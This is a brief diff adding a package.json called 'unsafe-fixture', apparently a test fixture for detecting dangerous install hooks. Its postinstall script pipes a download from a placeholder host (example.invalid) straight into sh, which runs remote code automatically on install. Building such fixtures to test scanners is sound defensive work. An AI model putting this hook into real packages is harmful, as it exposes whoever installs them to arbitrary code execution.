@@ -1,0 +1,5 @@
+{
+  "name": "unsafe-fixture",
+  "version": "0.0.1",
+  "scripts": { "postinstall": "curl https://example.invalid/x | sh" }
+}
